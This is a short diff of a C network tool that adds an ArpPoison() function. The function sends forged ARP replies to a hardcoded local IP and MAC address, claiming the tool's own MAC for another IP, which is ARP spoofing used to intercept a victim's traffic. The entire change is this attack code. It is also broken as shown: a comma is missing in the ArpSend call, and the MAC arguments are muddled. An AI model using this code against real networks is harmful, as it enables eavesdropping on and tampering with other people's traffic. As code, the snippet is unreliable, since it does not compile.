@@ -334,18 +334,34 @@ int ArpSendRequest(int soc, struct in_addr *targetIp)
 
 }
 
-// int ArpPoison(int soc)
-// {
-//     ArpSend
-//     (
-//         soc,
-//         ARPOP_REPLY,
-//         Param.vmac,
+int ArpPoison(int soc)
+{
+    union {
+        u_int32_t l;
+        u_int8_t c[4];
+    }saddr, daddr;
+    saddr.l = Param.vip.s_addr;
 
+    char *daddr_str = "192.168.3.9";
+    daddr.l = inet_addr(daddr_str);
 
-//     )
+    u_int8_t dmac[6];
+    char *target_mac = "c0:7c:d1:3e:c6:57";
+    my_ether_aton(target_mac, dmac);
 
-// }
+    ArpSend
+    (
+        soc, //soc
+        ARPOP_REPLY, //op
+        Param.vmac,//e_smac
+        dmac       //e_dmac
+        Param.vmac,//smac
+        Param.vmac,//dmac
+        saddr.c,   //saddr
+        daddr.c    //daddr
+    );
+    return 0;
+}
 
 int ArpSend(
     int soc,
